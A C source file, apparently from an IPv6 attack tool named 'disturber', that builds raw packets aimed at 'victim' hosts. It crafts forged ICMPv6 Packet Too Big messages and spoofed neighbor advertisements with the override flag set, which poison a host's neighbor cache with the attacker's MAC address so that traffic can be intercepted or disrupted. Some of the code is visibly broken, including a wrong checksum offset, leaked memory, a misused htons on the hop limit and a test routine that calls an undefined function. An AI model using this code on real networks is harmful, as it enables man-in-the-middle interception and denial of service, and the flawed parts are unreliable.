#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <netinet/ether.h>
#include <netinet/ip6.h>
#include <netinet/icmp6.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#include <disturber.h>
#include <device.h>
#include <victims.h>

typedef struct pseudo_header {
	struct in6_addr ph_src;
	struct in6_addr ph_dst;
	u_int32_t ph_len;
	u_int8_t ph_zero[3];
	u_int8_t ph_nxt;
} pseudo_header;

void debug_packet(char *packet) {
	struct ethhdr *eth;
	struct ip6_hdr *ip6;
	struct icmp6_hdr *icmpv6;
	struct tcphdr *tcp;
	char addr[INET6_ADDRSTRLEN];

	eth = (struct ethhdr *)packet;
	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));

	if (ip6->ip6_nxt != IPPROTO_TCP && ip6->ip6_nxt != IPPROTO_ICMPV6)
		return;

	printf("\n- PACKET START -\n");

	printf("Ethernet:\n");
	printf("\tEther src: %s\n", ether_ntoa((struct ether_addr *)eth->h_source));
	printf("\tEther dest: %s\n", ether_ntoa((struct ether_addr *)eth->h_dest));

	printf("IPv6:\n");
	inet_ntop(AF_INET6, ip6->ip6_dst.s6_addr, addr, INET6_ADDRSTRLEN);
	printf("\tTo: %s\n", addr);
	memset(addr, 0, INET6_ADDRSTRLEN);
	inet_ntop(AF_INET6, ip6->ip6_src.s6_addr, addr, INET6_ADDRSTRLEN);
	printf("\tFrom: %s\n", addr);
	printf("\tPayload Length: 0x%x\n", ntohs(ip6->ip6_plen));

	switch (ip6->ip6_nxt) {
		case IPPROTO_ICMPV6:
			icmpv6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
			printf("ICMPv6:\n");
			printf("\tCode: %d\n", icmpv6->icmp6_code);
			printf("\tType: %d\n", icmpv6->icmp6_type);
			printf("\tCRC: %x\n", icmpv6->icmp6_cksum);
			break;
		case IPPROTO_TCP:
			tcp = (struct tcphdr *)((char *)ip6 + sizeof(struct ip6_hdr));
			printf("TCP:\n");
			printf("\tDest Port: %d\n", tcp->dest);
			printf("\tSrc Port: %d\n", tcp->source);
			break;
		default:
			break;
	}
	printf("- PACKET END -\n\n");
}

static unsigned short in_cksum(const unsigned char *addr, int len) {
	int nleft = len;
	unsigned int sum = 0;
	unsigned short *w = (unsigned short *)addr;
	unsigned short answer = 0;

	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	if (nleft == 1) {
		*(unsigned char *)(&answer) = *(const unsigned char *)w;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xFFFF);
	sum += (sum >> 16);
	answer = ~sum;

	return answer;
}

static unsigned short icmp6_cksum(struct ip6_hdr *ip6) {
	unsigned short sum = 0;
	unsigned char *buf;
	struct icmp6_hdr *icmp6, *tmp;
	struct pseudo_header *ph;

	//TODO: Check for memory overrun
	buf = malloc(sizeof(struct pseudo_header) + ntohs(ip6->ip6_plen));
	memset(buf, 0, sizeof(struct pseudo_header) + ntohs(ip6->ip6_plen));
	ph = (struct pseudo_header *)buf;
	icmp6 = (struct icmp6_hdr *)((char *)buf + sizeof(struct ip6_hdr));

	memcpy(&(ph->ph_src), &(ip6->ip6_src), sizeof(struct in6_addr));
	memcpy(&(ph->ph_dst), &(ip6->ip6_dst), sizeof(struct in6_addr));
	ph->ph_nxt = IPPROTO_ICMPV6;
	ph->ph_len = ip6->ip6_plen;

	tmp = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
	memcpy(icmp6, tmp, ntohs(ph->ph_len));

	sum = in_cksum(buf, sizeof(struct pseudo_header) + ntohs(ph->ph_len));

	return sum;
}

// WARN: needs to be freed
char *alloc_pkt2big(struct victim *svic, struct victim *dvic) {
	struct ip6_hdr *ip6;
	struct icmp6_hdr *icmp6;
	char *packet;
	uint16_t len = sizeof(struct ip6_hdr) +
					sizeof(struct icmp6_hdr);

	packet = malloc(len);
	memset(packet, 0, len);

	/* IPv6 Header */
	ip6 = (struct ip6_hdr *)packet;
	ip6->ip6_dst = dvic->ipv6;
	ip6->ip6_src = svic->ipv6;
	ip6->ip6_plen = htons(len);
	ip6->ip6_nxt = IPPROTO_ICMPV6;

	/* ICMPv6 Header */
	icmp6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
	icmp6->icmp6_type = ICMP6_PACKET_TOO_BIG;

	icmp6->icmp6_cksum = icmp6_cksum(ip6);

	return packet;
}

// WARN:  needs to be freed
char *alloc_ndsolicit(struct in6_addr *addr) {
	struct ip6_hdr *ip6;
	struct icmp6_hdr *icmp6;
	struct nd_neighbor_solicit *nd;
	char *packet;
	uint16_t len = sizeof(struct ip6_hdr) +
					sizeof(struct nd_neighbor_solicit);

	if (!addr)
		return NULL;

	packet = malloc(len);
	memset(packet, 0, len);

	/* IPv6 Header */
	/* TODO: Revisar os endereços */
	ip6 = (struct ip6_hdr *)packet;
	memcpy(&ip6->ip6_dst, addr, sizeof(struct in6_addr));
	ip6->ip6_src = device.ipv6;
	ip6->ip6_plen = htons(len);
	ip6->ip6_nxt = IPPROTO_ICMPV6;

	/* ICMPv6 Header */
	icmp6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
	icmp6->icmp6_type = ND_NEIGHBOR_SOLICIT;

	/* ND Solicit */
	nd = (struct nd_neighbor_solicit *)icmp6;
	memcpy(&nd->nd_ns_target, addr, sizeof(struct in6_addr));

	icmp6->icmp6_cksum = icmp6_cksum(ip6);

	return packet;
}

// WARN:  needs to be freed
/* source victim data, dest victim */
char *alloc_ndadvert(struct victim *svic, struct victim *dvic) {
	struct ip6_hdr *ip6;
	struct icmp6_hdr *icmp6;
	struct nd_neighbor_advert *nd;
	struct nd_opt_hdr *opt;
	char *hwaddr;
	char *packet;
	uint16_t len = sizeof(struct ip6_hdr) +
					sizeof(struct nd_neighbor_advert) +
					sizeof(struct nd_opt_hdr) +
					ETH_ALEN;

	if (!svic || !dvic)
		return NULL;

	packet = malloc(len);
	memset(packet, 0, len);

	/* IPv6 Header */
	/* TODO: Revisar os endereços */
	ip6 = (struct ip6_hdr *)packet;
	ip6->ip6_dst = dvic->ipv6;
	ip6->ip6_src = svic->ipv6;
	ip6->ip6_plen = htons(len);
	ip6->ip6_nxt = IPPROTO_ICMPV6;
	ip6->ip6_hlim = htons(255); //ta ficando 64...

	/* ICMPv6 Header */
	icmp6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
	icmp6->icmp6_type = ND_NEIGHBOR_ADVERT;
	//*(icmp6->icmp6_data32) = ND_NA_FLAG_OVERRIDE || ND_NA_FLAG_OVERRIDE;
	icmp6->icmp6_data8[0] = 0x60;

	/* ND Advertise */
	nd = (struct nd_neighbor_advert *)icmp6;
	nd->nd_na_target = dvic->ipv6;

	opt = (struct nd_opt_hdr *)((char *)nd + sizeof(struct nd_neighbor_advert));
	opt->nd_opt_type = ND_OPT_TARGET_LINKADDR;
	opt->nd_opt_len = 1;
	hwaddr = (char *)((char *)opt + sizeof(struct nd_opt_hdr));
	memcpy(hwaddr, &device.hwaddr, ETH_ALEN);

	icmp6->icmp6_cksum = icmp6_cksum(ip6);

	return packet;
}

#ifdef __PKG_TEST__
main() {
	int i;
	char *pkt = pkt2big();

	for (i = 0; i < sizeof(struct ethhdr); i++) {
		printf("%X", pkt[i]);
		if (!((i + 1) % 10))
			printf("\n");
	}
	printf("\n");
}
#endif

